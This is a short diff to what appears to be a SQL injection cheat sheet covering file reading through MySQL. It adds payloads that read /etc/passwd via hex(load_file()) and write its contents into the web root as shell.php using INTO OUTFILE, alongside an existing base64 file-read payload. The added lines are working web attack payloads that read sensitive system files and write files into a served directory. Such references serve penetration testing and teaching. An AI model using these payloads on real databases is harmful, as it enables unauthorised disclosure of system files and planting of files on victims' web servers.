@@ -25,3 +25,13 @@ Just like normal LFI, it is possible to convert the content of the file in base6
 ```sql
 TO_base64(LOAD_FILE('/var/www/html/index.php'))  
 ```
+
+You can also use **hex()** function in configuration files especially, when some characters are non-readable and might break the execution of the query:  
+```sql
+hex(load_file('/etc/passwd'))
+```
+
+It is possible to read the content of the file and copy it somewhere else where it's accessible to read:  
+```
+load_file('/etc/passwd') INTO OUTFILE '/var/www/html/shell.php'--
+```
